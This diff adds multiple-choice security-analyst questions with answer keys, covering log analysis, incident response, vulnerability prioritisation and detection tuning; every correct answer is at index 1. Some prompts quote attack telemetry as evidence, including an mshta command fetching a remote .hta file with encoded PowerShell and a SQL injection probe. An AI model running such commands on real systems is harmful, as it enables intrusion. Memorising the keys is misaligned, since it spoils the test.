@@ -1358,5 +1358,685 @@
     ],
     "answerIndex": 1,
     "rationale": "Suspicious DNS patterns warrant hypothesis testing with host telemetry before broad disruptive actions."
+  },
+  {
+    "id": "cysa-log-021",
+    "category": "log_analysis",
+    "tags": [
+      "scope_blindness"
+    ],
+    "difficulty": 3,
+    "prompt": "Web proxy snippet:\n09:11:02 src=10.40.12.8 user=apatel method=GET url=https://fileshare.example.com/a.zip status=200 bytes_in=822\n09:11:05 src=10.40.12.8 user=apatel method=POST url=https://paste-sync.example/api/upload status=201 bytes_out=184392\n09:11:07 src=10.40.12.8 user=apatel method=POST url=https://paste-sync.example/api/upload status=201 bytes_out=176201\nWhat is the BEST next data source to confirm or deny exfiltration?",
+    "choices": [
+      "Corporate newsletter archive",
+      "Endpoint process/network telemetry on 10.40.12.8 to identify the process and file path tied to the POSTs",
+      "Delete the user's account immediately",
+      "Building access badge logs"
+    ],
+    "answerIndex": 1,
+    "rationale": "Host telemetry ties outbound uploads to a specific process and file, which is the fastest way to validate suspected exfiltration."
+  },
+  {
+    "id": "cysa-log-022",
+    "category": "log_analysis",
+    "tags": [
+      "confuses_fp_tp"
+    ],
+    "difficulty": 2,
+    "prompt": "DNS logs show 120 TXT lookups from one Linux server to _acme-challenge records across internal domains during a 15-minute window. What is the BEST next step?",
+    "choices": [
+      "Treat as DNS tunneling and isolate immediately",
+      "Check certificate automation/change records for that server and correlate with cron/service activity",
+      "Block all TXT queries enterprise-wide",
+      "Ignore permanently because TXT queries are always benign"
+    ],
+    "answerIndex": 1,
+    "rationale": "ACME flows can legitimately generate TXT queries; correlate with automation context before escalating or suppressing."
+  },
+  {
+    "id": "cysa-log-023",
+    "category": "log_analysis",
+    "tags": [
+      "tool_output_misread"
+    ],
+    "difficulty": 3,
+    "prompt": "Auth logs snippet:\n4625 user=helpdesk2 src=10.1.6.44 substatus=0xC000006A\n4625 user=helpdesk2 src=10.1.6.44 substatus=0xC000006A\n4624 user=helpdesk2 src=10.1.6.44 logonType=3\n4672 user=helpdesk2 src=10.1.6.44\nWhat is the BEST next step?",
+    "choices": [
+      "Reset every domain password",
+      "Validate whether 10.1.6.44 is an authorized admin jump host, then review commands/processes executed after the privileged logon",
+      "Assume incident is closed because success followed failures",
+      "Unplug core switches"
+    ],
+    "answerIndex": 1,
+    "rationale": "A successful privileged logon after failures needs source validation and follow-on activity review to determine compromise scope."
+  },
+  {
+    "id": "cysa-log-024",
+    "category": "log_analysis",
+    "tags": [
+      "missed_context"
+    ],
+    "difficulty": 3,
+    "prompt": "NetFlow indicates steady outbound traffic from a finance workstation to 198.51.100.23 over TCP/443, with low bytes_out and high bytes_in for 6 hours. The domain resolves to a major software vendor CDN. What is the BEST interpretation and next step?",
+    "choices": [
+      "Confirmed data theft, isolate finance subnet",
+      "Likely software/content download behavior; verify with endpoint application/update logs before closing",
+      "Immediately block all CDN domains",
+      "No need to verify because CDN traffic is always safe"
+    ],
+    "answerIndex": 1,
+    "rationale": "Traffic direction and destination context suggest download activity, but endpoint verification is still needed for confidence."
+  },
+  {
+    "id": "cysa-log-025",
+    "category": "log_analysis",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "Email gateway logs show one user clicked a URL later categorized as phishing. EDR has no alert yet. What is the BEST next data source to confirm or deny execution?",
+    "choices": [
+      "Quarterly audit meeting notes",
+      "Browser history and process execution telemetry for that user endpoint around click time",
+      "Immediately send breach notification to all customers",
+      "Printer spool logs"
+    ],
+    "answerIndex": 1,
+    "rationale": "Execution evidence on the endpoint is the fastest way to distinguish a mere click from active compromise."
+  },
+  {
+    "id": "cysa-log-026",
+    "category": "log_analysis",
+    "tags": [
+      "scope_blindness"
+    ],
+    "difficulty": 2,
+    "prompt": "Firewall logs:\nDENY src=10.22.5.19 dst=203.0.113.77 dpt=23\nDENY src=10.22.5.20 dst=203.0.113.77 dpt=23\nDENY src=10.22.5.21 dst=203.0.113.77 dpt=23\nDENY src=10.22.5.22 dst=203.0.113.77 dpt=23\nWhat is the BEST next step?",
+    "choices": [
+      "Reimage all four hosts now",
+      "Determine whether these hosts are managed scanners or IoT devices and check internal east-west scans from same sources",
+      "Disable firewall deny logging",
+      "Escalate as confirmed worm without further evidence"
+    ],
+    "answerIndex": 1,
+    "rationale": "Multiple hosts probing Telnet may be expected scanning or compromise; asset role and lateral activity checks quickly establish scope."
+  },
+  {
+    "id": "cysa-log-027",
+    "category": "log_analysis",
+    "tags": [
+      "wrong_priority"
+    ],
+    "difficulty": 3,
+    "prompt": "SIEM alert: impossible travel for CFO account (US login followed by EU login 6 minutes later). MFA success appears for both. What is the BEST next step?",
+    "choices": [
+      "Disable all VPN access company-wide",
+      "Correlate IdP session details (device IDs, source ASNs, token issuance) and contact CFO executive support to validate travel/proxy usage",
+      "Mark as false positive immediately",
+      "Rotate every employee credential"
+    ],
+    "answerIndex": 1,
+    "rationale": "High-risk account warrants rapid identity-session validation and user confirmation before broad disruptive controls."
+  },
+  {
+    "id": "cysa-log-028",
+    "category": "log_analysis",
+    "tags": [
+      "assumption_jump"
+    ],
+    "difficulty": 2,
+    "prompt": "A SOC analyst sees repeated 404 requests for /wp-admin from internet IPs against a non-WordPress site. What is the BEST next step?",
+    "choices": [
+      "Declare application breach",
+      "Classify as common internet scanning and verify no corresponding successful auth or code execution indicators",
+      "Take public website offline for 48 hours",
+      "Ignore all future web reconnaissance alerts"
+    ],
+    "answerIndex": 1,
+    "rationale": "Recon noise is common; confirming absence of follow-on success is the right proportional action."
+  },
+  {
+    "id": "cysa-log-029",
+    "category": "log_analysis",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "Cloud audit logs snippet:\nCreateAccessKey user=ci-bot result=Success\nListBuckets user=ci-bot result=Success\nGetObject bucket=prod-backups key=db-2026-02-01.sql result=Success\nNo change ticket exists. What is the BEST next data source to confirm whether this is authorized automation?",
+    "choices": [
+      "Corporate org chart",
+      "CI/CD pipeline run history and secret-rotation records for ci-bot at matching timestamps",
+      "Immediately delete all cloud access keys",
+      "Endpoint DNS logs from random users"
+    ],
+    "answerIndex": 1,
+    "rationale": "Pipeline and key-management records directly confirm whether this access pattern was expected automation or misuse."
+  },
+  {
+    "id": "cysa-log-030",
+    "category": "log_analysis",
+    "tags": [
+      "missed_context"
+    ],
+    "difficulty": 3,
+    "prompt": "Database logs show 18 failed logins then one success for app_reader from an application server after a password rotation window. What is the BEST next step?",
+    "choices": [
+      "Assume credential stuffing and declare incident",
+      "Check password vault/rotation rollout status for that app server and review subsequent query behavior for anomalies",
+      "Shut down the database cluster",
+      "Ignore because service accounts cannot be attacked"
+    ],
+    "answerIndex": 1,
+    "rationale": "Rotation drift is plausible; validate rollout context and post-auth behavior before escalating or dismissing."
+  },
+  {
+    "id": "cysa-ir-021",
+    "category": "incident_response",
+    "tags": [
+      "sequence_error"
+    ],
+    "difficulty": 3,
+    "prompt": "EDR confirms ransomware encryption on one file server, and the host is still reachable. What is the BEST next step?",
+    "choices": [
+      "Immediately rebuild the server from backup",
+      "Isolate the impacted server from the network while preserving volatile evidence and start scope checks for lateral spread",
+      "Email all employees to power off systems",
+      "Pay ransom to stop spread"
+    ],
+    "answerIndex": 1,
+    "rationale": "Containment with evidence preservation is the correct first move before eradication/recovery actions."
+  },
+  {
+    "id": "cysa-ir-022",
+    "category": "incident_response",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "A suspected malicious PowerShell process is active on a domain admin workstation. What is the BEST next data source to collect before killing the process?",
+    "choices": [
+      "HR onboarding spreadsheet",
+      "Live process command line, parent/child tree, and memory capture from that endpoint",
+      "Asset depreciation schedule",
+      "Public whois lookup"
+    ],
+    "answerIndex": 1,
+    "rationale": "Process ancestry and memory capture preserve crucial evidence that may be lost if the process is terminated first."
+  },
+  {
+    "id": "cysa-ir-023",
+    "category": "incident_response",
+    "tags": [
+      "wrong_priority"
+    ],
+    "difficulty": 2,
+    "prompt": "Phishing emails with a credential-harvest link were delivered to 200 users; five clicked. No confirmed account abuse yet. What is the BEST next step?",
+    "choices": [
+      "Reimage all user laptops",
+      "Block sender domains/URLs, force password resets for clickers, and review sign-in logs for those accounts",
+      "Wait for attacker activity before action",
+      "Shut down external email for a week"
+    ],
+    "answerIndex": 1,
+    "rationale": "Immediate targeted containment reduces risk quickly without unnecessary enterprise-wide disruption."
+  },
+  {
+    "id": "cysa-ir-024",
+    "category": "incident_response",
+    "tags": [
+      "sequence_error"
+    ],
+    "difficulty": 3,
+    "prompt": "IR team suspects data exfiltration through an active SSH session from a Linux jump box. What is the BEST next step?",
+    "choices": [
+      "Run apt upgrade first",
+      "Capture session metadata and relevant network/process evidence, then contain by restricting egress from that host",
+      "Delete all SSH keys across the company",
+      "Announce breach publicly before validation"
+    ],
+    "answerIndex": 1,
+    "rationale": "You need session evidence and controlled containment to support attribution and impact assessment."
+  },
+  {
+    "id": "cysa-ir-025",
+    "category": "incident_response",
+    "tags": [
+      "scope_blindness"
+    ],
+    "difficulty": 3,
+    "prompt": "IR timeline snippet:\n10:03 EDR alert: credential dumping on WS-447\n10:05 New SMB sessions from WS-447 to FS-12, FS-19\n10:07 4672 events for svc_ops on FS-12\nWhat is the BEST next step?",
+    "choices": [
+      "Contain only WS-447 and close",
+      "Prioritize containment of WS-447 and the newly touched servers, then hunt for svc_ops use on peer systems",
+      "Patch WS-447 next week",
+      "Wipe the SIEM index"
+    ],
+    "answerIndex": 1,
+    "rationale": "Evidence suggests lateral movement; containment must include likely pivot targets, not just patient zero."
+  },
+  {
+    "id": "cysa-ir-026",
+    "category": "incident_response",
+    "tags": [
+      "missed_context"
+    ],
+    "difficulty": 2,
+    "prompt": "A vendor reports your API key posted publicly, but usage logs show only two requests from your normal integration IP since exposure. What is the BEST next step?",
+    "choices": [
+      "Ignore because no abuse yet",
+      "Rotate the key immediately, validate recent API activity for anomalous calls, and tighten key-scoping controls",
+      "Take all APIs offline indefinitely",
+      "Notify regulators before internal triage"
+    ],
+    "answerIndex": 1,
+    "rationale": "Exposed credentials should be rotated quickly while reviewing usage for signs of misuse."
+  },
+  {
+    "id": "cysa-ir-027",
+    "category": "incident_response",
+    "tags": [
+      "sequence_error"
+    ],
+    "difficulty": 3,
+    "prompt": "After malware containment, operations asks to restore a critical app server from backup immediately. What is the BEST next step?",
+    "choices": [
+      "Restore now to meet SLA regardless of cause",
+      "Verify eradication and IOC-based monitoring readiness before restoration, then recover in a controlled order",
+      "Decommission the app permanently",
+      "Skip post-incident review"
+    ],
+    "answerIndex": 1,
+    "rationale": "Recovery before eradication validation risks reinfection; sequence discipline prevents repeated outage."
+  },
+  {
+    "id": "cysa-ir-028",
+    "category": "incident_response",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "VPN logs snippet:\nuser=vendor1 src=198.51.100.61 mfa=success\nuser=vendor1 src=198.51.100.61 device=unknown\nuser=vendor1 file_access=\\\\eng-share\\design\nNo maintenance window exists. What is the BEST next data source to confirm compromise versus legitimate emergency access?",
+    "choices": [
+      "Last year's awareness training results",
+      "Vendor ticketing/change records plus internal sponsor approval communication for that timeframe",
+      "Cafeteria camera footage",
+      "Disable all vendor contracts"
+    ],
+    "answerIndex": 1,
+    "rationale": "Change and sponsor records are the fastest authoritative source for whether access was approved."
+  },
+  {
+    "id": "cysa-ir-029",
+    "category": "incident_response",
+    "tags": [
+      "wrong_priority"
+    ],
+    "difficulty": 2,
+    "prompt": "A suspected malware host belongs to the CFO during board prep. Legal asks for minimal disruption but reliable containment. What is the BEST next step?",
+    "choices": [
+      "Do nothing until after board meeting",
+      "Apply network isolation allowing only remote IR tooling, then collect triage evidence",
+      "Publicly name-and-shame the user",
+      "Factory reset the laptop immediately"
+    ],
+    "answerIndex": 1,
+    "rationale": "Granular containment balances business continuity with security and evidence needs."
+  },
+  {
+    "id": "cysa-ir-030",
+    "category": "incident_response",
+    "tags": [
+      "assumption_jump"
+    ],
+    "difficulty": 3,
+    "prompt": "SOC receives intel of active exploitation for a product used internally, but no local alerts yet. What is the BEST next incident response action?",
+    "choices": [
+      "Assume compromise and trigger full DR failover",
+      "Start targeted threat hunt and exposure validation on affected assets while preparing containment playbook steps",
+      "Ignore until IDS fires",
+      "Patch every system including unrelated platforms first"
+    ],
+    "answerIndex": 1,
+    "rationale": "When exploitation is plausible but unconfirmed, focused validation and readiness are the most effective immediate actions."
+  },
+  {
+    "id": "cysa-vuln-021",
+    "category": "vuln_prioritization",
+    "tags": [
+      "wrong_priority"
+    ],
+    "difficulty": 3,
+    "prompt": "You must choose one vulnerability to remediate first this week. Option A: CVSS 9.8 on an internal lab server with no sensitive data. Option B: CVSS 8.2 with known active exploit on an internet-facing payroll portal. What is the BEST next step?",
+    "choices": [
+      "Patch Option A first because higher CVSS",
+      "Prioritize Option B due to exploit activity, exposure, and business criticality",
+      "Patch neither until next quarter",
+      "Decommission payroll portal immediately"
+    ],
+    "answerIndex": 1,
+    "rationale": "Exploitability, exposure, and asset criticality outweigh raw CVSS in risk-based prioritization."
+  },
+  {
+    "id": "cysa-vuln-022",
+    "category": "vuln_prioritization",
+    "tags": [
+      "missed_context"
+    ],
+    "difficulty": 2,
+    "prompt": "Scanner flags 300 medium findings on workstations and one high-severity RCE on a public VPN gateway with compensating WAF rule uncertain. What is the BEST next data source to confirm remediation priority?",
+    "choices": [
+      "Desk phone inventory",
+      "External validation (attack-surface scan/logs) to verify gateway exploitability despite WAF",
+      "Ignore gateway because WAF exists",
+      "Prioritize only by count of findings"
+    ],
+    "answerIndex": 1,
+    "rationale": "Directly validating exploitability of the exposed critical gateway best informs immediate priority."
+  },
+  {
+    "id": "cysa-vuln-023",
+    "category": "vuln_prioritization",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "A critical container image CVE is reported. Runtime inventory shows the vulnerable package is present, but only in a dormant sidecar not deployed in production. What is the BEST next step?",
+    "choices": [
+      "Declare emergency outage for all clusters",
+      "Prioritize fixes for production-exposed workloads first and schedule the dormant component in normal cycle with monitoring",
+      "Ignore CVE forever",
+      "Patch random hosts to show progress"
+    ],
+    "answerIndex": 1,
+    "rationale": "Prioritization should focus on actively exposed production risk while still tracking lower-risk items."
+  },
+  {
+    "id": "cysa-vuln-024",
+    "category": "vuln_prioritization",
+    "tags": [
+      "tool_output_misread"
+    ],
+    "difficulty": 3,
+    "prompt": "Vulnerability report snippet:\nAsset=APP-EXT-01 severity=High vuln=CVE-2025-1111 exploit=PoC public\nAsset=APP-INT-22 severity=Critical vuln=CVE-2024-9999 exploit=None known\nAsset=DC-02 severity=Medium vuln=CVE-2023-7777 exploit=Active\nWhat is the BEST remediation prioritization order?",
+    "choices": [
+      "APP-INT-22, APP-EXT-01, DC-02",
+      "APP-EXT-01, DC-02, APP-INT-22 based on exposure/exploit evidence",
+      "DC-02 only, ignore others",
+      "Sort purely by severity label regardless context"
+    ],
+    "answerIndex": 1,
+    "rationale": "External exposure and active/public exploitability drive urgency more than severity labels alone."
+  },
+  {
+    "id": "cysa-vuln-025",
+    "category": "vuln_prioritization",
+    "tags": [
+      "scope_blindness"
+    ],
+    "difficulty": 2,
+    "prompt": "A patch for a high-risk library is available, but 40% of affected hosts are in a legacy segment with strict uptime constraints. What is the BEST next step?",
+    "choices": [
+      "Delay all patching until legacy window opens",
+      "Patch internet-facing and critical assets now, apply compensating controls/monitoring for deferred legacy hosts",
+      "Ignore legacy hosts entirely",
+      "Reboot every host immediately during business hours"
+    ],
+    "answerIndex": 1,
+    "rationale": "Risk reduction should proceed where feasible now while handling constrained systems with interim controls."
+  },
+  {
+    "id": "cysa-vuln-026",
+    "category": "vuln_prioritization",
+    "tags": [
+      "wrong_priority"
+    ],
+    "difficulty": 3,
+    "prompt": "Threat intel indicates a newly weaponized VPN vulnerability. Internal scan shows only one of six VPN concentrators is vulnerable, serving contractors with production access. What is the BEST next step?",
+    "choices": [
+      "Continue normal monthly cycle",
+      "Expedite remediation or mitigation on that concentrator immediately and verify access monitoring for contractor accounts",
+      "Patch low-risk kiosk software first",
+      "Turn off all contractor access permanently"
+    ],
+    "answerIndex": 1,
+    "rationale": "A single exposed choke point with active exploitation risk and privileged access should be handled urgently."
+  },
+  {
+    "id": "cysa-vuln-027",
+    "category": "vuln_prioritization",
+    "tags": [
+      "confuses_fp_tp"
+    ],
+    "difficulty": 2,
+    "prompt": "Scanner reports SMB signing disabled on 200 systems. Asset data reveals 180 are isolated lab devices; 20 are production file servers. What is the BEST next step?",
+    "choices": [
+      "Treat all 200 equally urgent",
+      "Prioritize remediation on the 20 production file servers first, then address labs by risk acceptance plan",
+      "Close all findings as false positives",
+      "Block SMB enterprise-wide immediately"
+    ],
+    "answerIndex": 1,
+    "rationale": "Asset criticality and exposure differentiate urgency even when the same control gap appears broadly."
+  },
+  {
+    "id": "cysa-vuln-028",
+    "category": "vuln_prioritization",
+    "tags": [
+      "assumption_jump"
+    ],
+    "difficulty": 3,
+    "prompt": "A zero-day advisory drops for software used by finance and HR apps. Vendor patch ETA is 10 days. What is the BEST next step?",
+    "choices": [
+      "Wait quietly for patch",
+      "Implement temporary mitigations (segmentation, WAF/IPS rules, restricted admin access), monitor exploit indicators, and prepare rapid patch rollout",
+      "Uninstall all finance and HR applications",
+      "Declare issue resolved after reading advisory"
+    ],
+    "answerIndex": 1,
+    "rationale": "When patches lag, compensating controls and monitoring reduce immediate risk while preparing for remediation."
+  },
+  {
+    "id": "cysa-vuln-029",
+    "category": "vuln_prioritization",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "Asset scan snippet:\nHost=web-prod-03 CVE=CVE-2025-3333 severity=High exploit=Active\nHost=web-stage-01 CVE=CVE-2025-3333 severity=High exploit=Active\nHost=jump-admin-01 CVE=CVE-2025-1212 severity=Medium exploit=Active\nWhat is the BEST next data source to finalize patch order?",
+    "choices": [
+      "Office seating chart",
+      "Business impact/asset criticality mapping and internet exposure status for listed hosts",
+      "Brand style guide",
+      "Employee PTO calendar"
+    ],
+    "answerIndex": 1,
+    "rationale": "Criticality and exposure context determine which actively exploitable host should be remediated first."
+  },
+  {
+    "id": "cysa-vuln-030",
+    "category": "vuln_prioritization",
+    "tags": [
+      "missed_context"
+    ],
+    "difficulty": 2,
+    "prompt": "A finding has CVSS 10 but requires local admin and physical console access. A second finding is CVSS 7.5 remote unauthenticated on a public API gateway. What is the BEST prioritization decision?",
+    "choices": [
+      "Fix CVSS 10 first by default",
+      "Prioritize the remote unauthenticated gateway issue first due to practical attack path",
+      "Treat both as low risk",
+      "Accept risk on gateway and fix desktop wallpapers"
+    ],
+    "answerIndex": 1,
+    "rationale": "Real-world exploit path and exposure can make a lower CVSS issue higher operational risk."
+  },
+  {
+    "id": "cysa-det-021",
+    "category": "detection_reasoning",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 3,
+    "prompt": "SIEM rule flags suspicious use of certutil.exe on one host. What is the BEST next data source to confirm or deny malicious intent?",
+    "choices": [
+      "Facilities maintenance tickets",
+      "Parent process, command-line arguments, and network connections for certutil on that host",
+      "CEO travel calendar",
+      "Disable all Windows utilities globally"
+    ],
+    "answerIndex": 1,
+    "rationale": "Process context and network behavior best distinguish benign administrative use from attacker tradecraft."
+  },
+  {
+    "id": "cysa-det-022",
+    "category": "detection_reasoning",
+    "tags": [
+      "confuses_fp_tp"
+    ],
+    "difficulty": 2,
+    "prompt": "Detection fires on 'multiple failed SSH logins' to Linux servers nightly at 02:00 from one internal IP. Asset inventory marks source as approved vulnerability scanner. What is the BEST next step?",
+    "choices": [
+      "Suppress all SSH brute-force detections",
+      "Tune rule to account for scanner source/time window while preserving alerts for other sources",
+      "Escalate every night as critical incident",
+      "Block scanner permanently"
+    ],
+    "answerIndex": 1,
+    "rationale": "Context-aware tuning reduces predictable noise without eliminating meaningful brute-force coverage."
+  },
+  {
+    "id": "cysa-det-023",
+    "category": "detection_reasoning",
+    "tags": [
+      "tool_output_misread"
+    ],
+    "difficulty": 3,
+    "prompt": "Alert snippet:\nrule=Possible C2 Beacon\nhost=WS-88\ndestination=203.0.113.54\ninterval=60s jitter=2s\nEDR verdict=unknown\nWhat is the BEST next step?",
+    "choices": [
+      "Close as false positive because verdict is unknown",
+      "Review proxy/DNS history and endpoint process telemetry to test consistent beaconing hypothesis",
+      "Isolate every workstation in subnet",
+      "Delete the detection rule"
+    ],
+    "answerIndex": 1,
+    "rationale": "Periodic network pattern plus endpoint/process corroboration is needed to confirm or refute beaconing."
+  },
+  {
+    "id": "cysa-det-024",
+    "category": "detection_reasoning",
+    "tags": [
+      "missed_context"
+    ],
+    "difficulty": 2,
+    "prompt": "A data-loss detection alerts on large upload from engineering laptop, but change ticket shows approved transfer to a new company-owned cloud tenant. What is the BEST detection engineering response?",
+    "choices": [
+      "Mark as malicious regardless of ticket",
+      "Document as expected event, enrich rule with tenant allowlist/change-ticket context, and monitor for deviations",
+      "Disable DLP controls globally",
+      "Ignore all future engineering uploads"
+    ],
+    "answerIndex": 1,
+    "rationale": "Validated business context should be encoded into detection logic while keeping guardrails for abuse cases."
+  },
+  {
+    "id": "cysa-det-025",
+    "category": "detection_reasoning",
+    "tags": [
+      "assumption_jump"
+    ],
+    "difficulty": 3,
+    "prompt": "An IDS signature for SQL injection triggers on /search?q='or1=1-- from one IP, but WAF blocked the request and app logs show HTTP 403. What is the BEST next step?",
+    "choices": [
+      "Declare database breach",
+      "Correlate for any successful SQL errors/auth bypass attempts from same source before escalating severity",
+      "Take production database offline",
+      "Disable SQLi detection due to noise"
+    ],
+    "answerIndex": 1,
+    "rationale": "Blocked probes indicate attempted attack; severity should depend on evidence of successful exploitation."
+  },
+  {
+    "id": "cysa-det-026",
+    "category": "detection_reasoning",
+    "tags": [
+      "wrong_priority"
+    ],
+    "difficulty": 3,
+    "prompt": "You can improve one detection this sprint: noisy malware hash match rule (500 alerts/day, low fidelity) or rare pass-the-hash rule (2 alerts/month, high impact). What is the BEST prioritization?",
+    "choices": [
+      "Ignore both until next quarter",
+      "Improve the high-volume low-fidelity rule first to recover analyst capacity while preserving high-impact coverage",
+      "Disable pass-the-hash rule",
+      "Focus only on dashboard cosmetics"
+    ],
+    "answerIndex": 1,
+    "rationale": "Reducing large alert fatigue can meaningfully improve SOC throughput without sacrificing critical detections."
+  },
+  {
+    "id": "cysa-det-027",
+    "category": "detection_reasoning",
+    "tags": [
+      "scope_blindness"
+    ],
+    "difficulty": 3,
+    "prompt": "Cloud detection flags 'new IAM admin policy attached' for user devops-temp. What is the BEST next data source to confirm or deny malicious privilege escalation?",
+    "choices": [
+      "Company social media feed",
+      "Cloud audit trail around policy attach (who/when/source IP) plus related change-ticket approval",
+      "Disable all IAM policies",
+      "Close alert since user is in IT"
+    ],
+    "answerIndex": 1,
+    "rationale": "Audit and change-approval context directly answer whether admin privilege assignment was authorized."
+  },
+  {
+    "id": "cysa-det-028",
+    "category": "detection_reasoning",
+    "tags": [
+      "evidence_gap"
+    ],
+    "difficulty": 2,
+    "prompt": "Authentication anomaly model flags 30 users after an IdP rollout. What is the BEST next step?",
+    "choices": [
+      "Escalate all 30 as account takeover",
+      "Compare anomaly features pre/post rollout and tune baseline thresholds before incident escalation",
+      "Turn off MFA",
+      "Ignore model output forever"
+    ],
+    "answerIndex": 1,
+    "rationale": "Major platform changes can shift baselines; recalibration prevents mass false positives while preserving detection value."
+  },
+  {
+    "id": "cysa-det-029",
+    "category": "detection_reasoning",
+    "tags": [
+      "tool_output_misread"
+    ],
+    "difficulty": 3,
+    "prompt": "Endpoint telemetry snippet:\nprocess=mshta.exe parent=outlook.exe\ncmd=mshta http://198.51.100.44/a.hta\nchild=powershell.exe -enc ...\nWhat is the BEST next step for detection validation?",
+    "choices": [
+      "Treat as normal Office behavior",
+      "Correlate with email delivery and isolate host-level evidence to confirm phishing-driven execution chain",
+      "Close because antivirus did not block",
+      "Block all outbound HTTP permanently"
+    ],
+    "answerIndex": 1,
+    "rationale": "The process chain is suspicious; corroborating email origin and host evidence confirms campaign context and impact."
+  },
+  {
+    "id": "cysa-det-030",
+    "category": "detection_reasoning",
+    "tags": [
+      "confuses_fp_tp"
+    ],
+    "difficulty": 2,
+    "prompt": "A rule alerts on 'new scheduled task creation' across 50 hosts after monthly patch deployment. What is the BEST reasoning outcome?",
+    "choices": [
+      "Assume mass compromise",
+      "Validate task names/paths against signed patch-management activity, then tune exclusions for expected maintenance tasks",
+      "Disable scheduled-task monitoring entirely",
+      "Escalate each host as separate breach"
+    ],
+    "answerIndex": 1,
+    "rationale": "Maintenance events can legitimately create tasks; validation and precise tuning keep fidelity without blind spots."
   }
 ]
